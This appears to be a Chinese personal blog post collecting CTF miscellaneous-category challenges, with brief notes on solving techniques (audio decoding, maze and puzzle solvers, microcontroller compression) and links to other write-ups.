<h2 id="Brainf-ck-Search"><a href="#Brainf-ck-Search" class="headerlink" title="Brainf*ck Search"></a><a target="_blank" rel="noopener" href="https://blog.bi0s.in/2024/02/26/Misc/BFS-BrainfuckSearch-bi0sctf2024/">Brainf*ck Search</a></h2><p>brainfuck code golfing挑战，使用有限的代码在tape中寻找flag子节。其他wp： <a target="_blank" rel="noopener" href="https://www.writeup.no/posts/bi0s-24-misc-brainfuck/">https://www.writeup.no/posts/bi0s-24-misc-brainfuck/</a></p>
<h2 id="Maize"><a href="#Maize" class="headerlink" title="Maize"></a><a target="_blank" rel="noopener" href="https://github.com/WolvSec/WolvCTF-2024-Challenges-Public/tree/master/rev/maize">Maize</a></h2><p>立体方块迷宫求解器</p>
<h2 id="rockyoudle"><a href="#rockyoudle" class="headerlink" title="rockyoudle"></a><a target="_blank" rel="noopener" href="https://gist.github.com/C0nstellati0n/78f5887b5bee235583a026840354ae54#rockyoudle">rockyoudle</a></h2><p>wordle求解器</p>
<h2 id="Mysterious-Melody"><a href="#Mysterious-Melody" class="headerlink" title="Mysterious Melody"></a><a target="_blank" rel="noopener" href="https://ctf.krauq.com/bcactf-2024">Mysterious Melody</a></h2><p>python获取midi文件的音符</p>
<p>使用audacity的手动做法： <a target="_blank" rel="noopener" href="https://github.com/BCACTF/bcactf-5.0/blob/main/mysterious-melody">https://github.com/BCACTF/bcactf-5.0/blob/main/mysterious-melody</a></p>
<h2 id="Touch-Tone-Telephone"><a href="#Touch-Tone-Telephone" class="headerlink" title="Touch Tone Telephone"></a><a target="_blank" rel="noopener" href="https://ctf.krauq.com/bcactf-2024">Touch Tone Telephone</a></h2><p>python解码dtmf wav脚本</p>
<p>题目官方的rust脚本： <a target="_blank" rel="noopener" href="https://github.com/BCACTF/bcactf-5.0/blob/main/touch-tone-telephone">https://github.com/BCACTF/bcactf-5.0/blob/main/touch-tone-telephone</a></p>
<h2 id="Picoify"><a href="#Picoify" class="headerlink" title="Picoify"></a><a target="_blank" rel="noopener" href="https://github.com/TFNS/writeups/tree/master/2024-06-30-UIUCTF/picoify">Picoify</a></h2><p>编写能在Microchip PIC16F628A上运行的压缩代码。特别之处在于，这玩意SRAM才224字节，甚至没法把要压缩的内容一股脑读进来，因此这里实现的是streaming compression。另外，PIC16 assembly code可以参考wp里的方式生成，先写个C代码再用<a target="_blank" rel="noopener" href="https://www.microchip.com/en-us/tools-resources/develop/mplab-xc-compilers">编译器</a>编译。这块最后实现的算法是huffman，并用python代码实现解压</p>
<p><a target="_blank" rel="noopener" href="https://maplebacon.org/2024/07/uiuctf-picoify/">https://maplebacon.org/2024/07/uiuctf-picoify/</a> 是另一种解法。作者直接根据压缩的内容发明了一个压缩算法。不过还是学到了很多东西：</p>
<ul>
<li>如何计算文本的entropy</li>
<li>使用<a target="_blank" rel="noopener" href="https://www.gnu.org/software/gperf/">gperf</a>生成完美哈希表</li>
<li>python内部会使用sbrk系统调用为常数量分配空间。如果sbrk被禁而且非要往里面塞大型变量的话，可以利用注释将内容“走私”进去，然后运行时访问程序的源代码将内容拿出来</li>
<li>清理sys.argv可以获得一部分内存（取决于原本sys.argv的大小）</li>
</ul>
<h1 id="WebSocket-VPN"><a href="#WebSocket-VPN" class="headerlink" title="WebSocket VPN"></a><a target="_blank" rel="noopener" href="https://ouuan.moe/post/2024/07/ductf-2024">WebSocket VPN</a></h1><p>通过websocket发送TCP握手IP报文和HTTP请求</p>
<h1 id="sleepy-alarm"><a href="#sleepy-alarm" class="headerlink" title="sleepy-alarm"></a><a target="_blank" rel="noopener" href="https://yun.ng/c/ctf/2024-ictf/forensics/sleepy-alarm">sleepy-alarm</a></h1><ul>
<li>使用audacity+python分析音频。有时候audacity里结果不清楚，在python里将相同的操作重复一遍再plot出来就清楚了</li>
<li>应用band pass noise reduction过滤某个频率出的噪音</li>
<li>另一种按时间间隔读取bit的做法： <a target="_blank" rel="noopener" href="https://gist.github.com/C0nstellati0n/78f5887b5bee235583a026840354ae54#sleepy-alarm">https://gist.github.com/C0nstellati0n/78f5887b5bee235583a026840354ae54#sleepy-alarm</a></li>
</ul>
<h1 id="left-in-the-dark"><a href="#left-in-the-dark" class="headerlink" title="left-in-the-dark"></a><a target="_blank" rel="noopener" href="https://yun.ng/c/ctf/2024-ictf/misc/left-in-the-dark">left-in-the-dark</a></h1><p>升级版A*迷宫寻路算法，无法提前得知迷宫地图，需要一边走一边探索路线，走错路后还需要重新规划路线并回退之前的操作</p>
<h1 id="MAN-in-the-middle"><a href="#MAN-in-the-middle" class="headerlink" title="MAN in the middle"></a><a target="_blank" rel="noopener" href="https://yun.ng/c/ctf/2024-deadsec-ctf/misc/man-in-the-middle">MAN in the middle</a></h1><p>解码曼彻斯特(Manchester)编码信号wav</p>
<h2 id="其他类型"><a href="#其他类型" class="headerlink" title="其他类型"></a>其他类型</h2><ul>
<li>小端下将bytes转为数字：<code>int.from_bytes(msg, &#39;little&#39;)</code>。类似地，大端填<code>&#39;big&#39;</code></li>
<li>pwntools将内存&#x2F;数字转为浮点数形式： <a target="_blank" rel="noopener" href="https://7rocky.github.io/en/ctf/other/htb-unictf/zombienator/">https://7rocky.github.io/en/ctf/other/htb-unictf/zombienator/</a> ，程序scanf用<code>%lf</code>时用</li>
<li><a target="_blank" rel="noopener" href="https://github.com/DvorakDwarf/Infinite-Storage-Glitch">Infinite-Storage-Glitch</a><ul>
<li>youtube不限制上传的视频数量，所以只要把文件转成视频，就有了无限的存储……</li>
</ul>
</li>
</ul>

                
              </div>
            
            <hr/>
            <div>
              <div class="post-metas my-3">
  
    <div class="post-meta mr-3 d-flex align-items-center">
      <i class="iconfont icon-category"></i>
      

<span class="category-chains">
  
  
    
      <span class="category-chain">
        
  <a href="/categories/CTF-%E5%B7%A5%E5%85%B7/" class="category-chain-item">CTF-工具</a>
  
  

      </span>
    
  
</span>

    </div>
  
  
    <div class="post-meta">
      <i class="iconfont icon-tags"></i>
      
        <a href="/tags/%E8%84%9A%E6%9C%AC/" class="print-no-link">#脚本</a>
      
    </div>
  
</div>


              
  

  <div class="license-box my-3">
    <div class="license-title">
      <div>脚本工具</div>
      <div>https://theganlove.github.io/2024/09/01/脚本工具/</div>
    </div>
    <div class="license-meta">
      
        <div class="license-meta-item">
          <div>作者</div>
          <div>uert</div>
        </div>
      
      
        <div class="license-meta-item license-meta-date">
          <div>发布于</div>
          <div>2024年9月1日</div>
        </div>
      
      
      
        <div class="license-meta-item">
          <div>许可协议</div>
          <div>
            
              
              
                <a class="print-no-link" target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
                  <span class="hint--top hint--rounded" aria-label="BY - 署名">
                    <i class="iconfont icon-cc-by"></i>
                  </span>
                </a>
              
            
          </div>
        </div>
      
    </div>
    <div class="license-icon iconfont"></div>
  </div>



              
                <div class="post-prevnext my-3">
                  <article class="post-prev col-6">
                    
                    
                      <a href="/2024/09/03/c%E8%AF%AD%E8%A8%80%E7%9A%84%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/" title="c语言的数据结构">
                        <i class="iconfont icon-arrowleft"></i>
                        <span class="hidden-mobile">c语言的数据结构</span>
                        <span class="visible-mobile">上一篇</span>
                      </a>
                    
                  </article>
                  <article class="post-next col-6">
                    
                    
                      <a href="/2024/09/01/ssrf/" title="ssrf">
                        <span class="hidden-mobile">ssrf</span>
                        <span class="visible-mobile">下一篇</span>
                        <i class="iconfont icon-arrowright"></i>
                      </a>
                    
                  </article>
                </div>
              
            </div>

            
          </article>
        </div>
      </div>
    </div>

    <div class="side-col d-none d-lg-block col-lg-2">
      
  <aside class="sidebar" style="margin-left: -1rem">
    <div id="toc">
  <p class="toc-header">
    <i class="iconfont icon-list"></i>
    <span>目录</span>
  </p>
  <div class="toc-body" id="toc-body"></div>
</div>



  </aside>


    </div>
  </div>
</div>





  



  



  



  



  







    

    
      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
      </a>
    

    
      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
     aria-hidden="true">
  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
    <div class="modal-content">
      <div class="modal-header text-center">
        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
          <span aria-hidden="true">&times;</span>
        </button>
      </div>
      <div class="modal-body mx-3">
        <div class="md-form mb-5">
          <input type="text" id="local-search-input" class="form-control validate">
          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
        </div>
        <div class="list-group" id="local-search-result"></div>
      </div>
    </div>
  </div>
</div>

    

    
  </main>

  <footer>
    <div class="footer-inner">
  
    <div class="footer-content">
       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
    </div>
  
  
  
</div>

  </footer>

  <!-- Scripts -->
  
  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />

  <script>
    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
    NProgress.start()
    window.addEventListener('load', function() {
      NProgress.done();
    })
  </script>


<script  src="https://lib.baomitu.com/jquery/3.6.4/jquery.min.js" ></script>
<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
<script  src="/js/events.js" ></script>
<script  src="/js/plugins.js" ></script>


  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
  <script>
    (function (window, document) {
      var typing = Fluid.plugins.typing;
      var subtitle = document.getElementById('subtitle');
      if (!subtitle || !typing) {
        return;
      }
      var text = subtitle.getAttribute('data-typed-text');
      
        typing(text);
      
    })(window, document);
  </script>




  
    <script  src="/js/img-lazyload.js" ></script>
  




  
<script>
  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.20.1/tocbot.min.js', function() {
    var toc = jQuery('#toc');
    if (toc.length === 0 || !window.tocbot) { return; }
    var boardCtn = jQuery('#board-ctn');
    var boardTop = boardCtn.offset().top;

    window.tocbot.init(Object.assign({
      tocSelector     : '#toc-body',
      contentSelector : '.markdown-body',
      linkClass       : 'tocbot-link',
      activeLinkClass : 'tocbot-active-link',
      listClass       : 'tocbot-list',
      isCollapsedClass: 'tocbot-is-collapsed',
      collapsibleClass: 'tocbot-is-collapsible',
      scrollSmooth    : true,
      includeTitleTags: true,
      headingsOffset  : -boardTop,
    }, CONFIG.toc));
    if (toc.find('.toc-list-item').length > 0) {
      toc.css('visibility', 'visible');
    }

    Fluid.events.registerRefreshCallback(function() {
      if ('tocbot' in window) {
        tocbot.refresh();
        var toc = jQuery('#toc');
        if (toc.length === 0 || !tocbot) {
          return;
        }
        if (toc.find('.toc-list-item').length > 0) {
          toc.css('visibility', 'visible');
        }
      }
    });
  });
</script>


  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>

  <script>Fluid.plugins.codeWidget();</script>


  
<script>
  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/5.0.0/anchor.min.js', function() {
    window.anchors.options = {
      placement: CONFIG.anchorjs.placement,
      visible  : CONFIG.anchorjs.visible
    };
    if (CONFIG.anchorjs.icon) {
      window.anchors.options.icon = CONFIG.anchorjs.icon;
    }
    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
    var res = [];
    for (var item of el) {
      res.push('.markdown-body > ' + item.trim());
    }
    if (CONFIG.anchorjs.placement === 'left') {
      window.anchors.options.class = 'anchorjs-link-left';
    }
    window.anchors.add(res.join(', '));

    Fluid.events.registerRefreshCallback(function() {
      if ('anchors' in window) {
        anchors.removeAll();
        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
        var res = [];
        for (var item of el) {
          res.push('.markdown-body > ' + item.trim());
        }
        if (CONFIG.anchorjs.placement === 'left') {
          anchors.options.class = 'anchorjs-link-left';
        }
        anchors.add(res.join(', '));
      }
    });
  });
</script>


  
<script>
  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
    Fluid.plugins.fancyBox();
  });
</script>


  <script>Fluid.plugins.imageCaption();</script>

  <script  src="/js/local-search.js" ></script>





<!-- 主题的启动项，将它保持在最底部 -->
<!-- the boot of the theme, keep it at the bottom -->
<script  src="/js/boot.js" ></script>


  

  <noscript>
    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
  </noscript>
</body>
</html>
